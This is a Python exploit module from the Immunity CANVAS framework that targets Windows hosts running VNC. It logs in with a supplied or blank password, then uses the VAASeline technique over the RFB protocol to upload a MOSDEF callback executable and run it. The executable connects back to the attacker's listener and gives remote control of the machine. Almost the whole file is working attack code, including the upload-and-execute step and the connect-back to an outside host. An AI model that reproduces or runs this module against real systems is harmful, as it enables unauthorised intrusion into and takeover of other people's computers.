#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")
import os, socket, time, re

import timeoutsocket
from exploitutils import *
import canvasengine
from canvasexploit import canvasexploit

import socket, time, sys, getopt
import logging

try:
    from libs.VAASeline import lib
    from libs.VAASeline.lib import ApplyVAASeline
    RFB_NOT_PRESENT = False
except Exception, err:
    RFB_NOT_PRESENT = True
    logging.warning("VAASeline_Control: %s" % err)
    logging.warning("Please see /libs/VAASeline/README for instructions on how to get the dependencies")
    raise ImportError

NAME= "VAASeline_Control"
DESCRIPTION= "Get a Win32 Node on a VNC system"
VERSION= "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="None"
DOCUMENTATION["Date public"]="00/00/00"
DOCUMENTATION["CERT Advisory"]="None"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["References"] = "None"
DOCUMENTATION["CVE Name"] = "None"
DOCUMENTATION["CVE Url"] = "None"
DOCUMENTATION["Notes"]="""
Execute arbitrary commands on a VNC system you have authentication credentials for using only the RFB protocol, we use the VAASeline technique to do this.

To use this module VAASeline requires some underlying modules from VNC2SWF.

VAASeline requires version 0.6.4 which can be found at:
(http://www.unixuser.org/~euske/vnc2swf/pyvnc2swf-0.6.4.tar.gz)

From the tarball we require:
rfb.py
cripple_des.py
image.py

Copy them to the <CANVAS>/libs/VAASeline/lib/
"""
PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Windows"] ]
PROPERTY["VERSION"]= ["2000", "XP", '2003', 'Vista' ]

targets = {}

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name=NAME
        ##Password is blank by deafult
        self.pw = ""
        #self.pw_list = None
        self.port = 5900
        return

    def getargs(self):
        self.getarg("pw")
        #self.getarg("pw_list")
        self.getarg("port")

        ## Probably need to include HTTP/ICMP versions as options as well
        self.binary_to_upload = os.path.join(self.engine.config["canvas_resources"], "mosdef_callback.exe")
        #self.binary_to_upload = os.path.join(self.engine.config["canvas_resources"], "HTTPMOSDEF2.exe")
        return


    def connect(self):
        """
        Connect to the VNC server
        """
        self.ports = [self.port] #TODO
        for port in self.ports:
            ##Get the rfb superclass initialised
            self.log("Attempting to connect to VNC service on %s:%d"%(self.host, port))
            self.vnc_skt=ApplyVAASeline.ApplyVAASeline(self.host, port, cb_script=os.path.join(self.engine.config["canvas_resources"],"cb_mon.vbs"))

            try:
                ##Initiate a connection
                self.vnc_skt.init()
                self.log( "VNC connection: Initialised on TCP/%d"%(port) )
                return 1

            except socket.timeout, msg:
                self.log("VNC connection: Socket time out: TCP/%d"%(port) )
            except socket.error, msg:
                self.log( "VNC connection: ERROR: %s: TCP/%d"%(msg[1],port) )
        else:
            ##No VNC port found
            return 0


    def vnc_login(self):
        """
        Try to login into the VNC server using supplied credentials
        """
        ##Try all the passwords supplied
        self.pw_list = [self.pw] #TODO
        for pw in self.pw_list:

            try:
                self.vnc_skt.set_pw(pw)
                ret=self.vnc_skt.auth()
                if pw == "":
                    self.log( "VNC AUTHENTICATION: password is BLANK")
                else:
                    self.log( "VNC AUTHENTICATION: password is '%s'"%(pw) )
                return 1

            except ApplyVAASeline.RFBAuthError, err:
                ##Password Phail
                self.cleanup()
                self.connect()

            except ApplyVAASeline.RFBError, err:
                ##RFB lib we superclass from bitches on blank pass - FIXME
                self.log("VNC AUTHENTICATION: error: %s"%err)
                self.cleanup()
                self.connect()

            except socket.timeout:
                ##A time at this points probably means that the server is set to pop a box
                ## to accept the connection attempt. If this is the case we're buggered
                self.log( "VNC AUTHENTICATION: server timed out on authentication. Likely is waiting for active user approval for the connection. If this is the case the VNC server has the password \"%s\""%(pw))
                return 0
        else:
            ##Didn't guess the right password with any of our tries
            self.log( "VNC AUTHENTICATION: server does not have any of the passwords checked for")
            return 0

    def cleanup(self):
        try:
            self.vnc_skt.close()
        except:
            pass

    def check_for_rfb_libs(self):
        ##The underlying module which implements the RPC/RFB technique for the vbs clipboard we are using
        ## this in turn imports the core VAASeline module and uses it's primitives
        if RFB_NOT_PRESENT:
            self.log( "****Core RFB libraries not present****" )
            self.log( """To use this module VAASeline requires some underlying modules from VNC2SWF.

        VAASeline requires version 0.6.4 which can be found at:
        (http://www.unixuser.org/~euske/vnc2swf/pyvnc2swf-0.6.4.tar.gz)

        From the tarball we require:
        rfb.py
        cripple_des.py
        image.py

        Copy them to the <CANVAS>/libs/VAASeline/lib/
            """)
            return 0
        else:
            return 1

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def run(self):

        if not self.check_for_rfb_libs():
            self.setInfo("%s (finished)" % (NAME))
            return 0

        self.getargs()

        self.host = self.target.interface

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        self.log("Attacking %s:%d"%(self.host,self.port))

        if not self.connect():
            self.setInfo("%s (finished)" % (NAME))
            return 0

        if not self.vnc_login():
            self.setInfo("%s (finished)" % (NAME))
            return 0

        ##OK we have a valid VNC connection to our target ..... break out the VAASeline
        self.log( "Initialising VAASeline RPC over RFB......")
        if not self.vnc_skt.go():
            self.log("Could not establish VNC connection to %s:%s"%(self.host, self.port))
            self.setInfo("%s (finished)" % (NAME))
            return 0


        ##Now upload a mosdef_callback binary and run it
        target_f_name = "%s-m.exe"%(time.time())
        self.log( "Uploading MOSDEF over RFB .....")
        self.vnc_skt.upload_exe(self.binary_to_upload, "%s\\%s"%(self.vnc_skt.temp_env, target_f_name))
        self.log( "Connecting back with MOSDEF to %s:%d...."%(self.callback.ip, self.callback.port))
        self.vnc_skt.run_exe("%s\\%s"%(self.vnc_skt.temp_env, target_f_name),"%s %s"%(self.callback.ip, self.callback.port))
        #self.vnc_skt.run_exe("%s\\%s"%(self.vnc_skt.temp_env, target_f_name),"%s %s 0"%(self.callback.ip, self.callback.port))
        self.log("Quitting RFB channel...")
        self.vnc_skt.quit()
        self.cleanup()
        self.log("Wait for MOSDEF node connect back")
        self.setInfo("%s (finished)" % (NAME))

        return 1

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
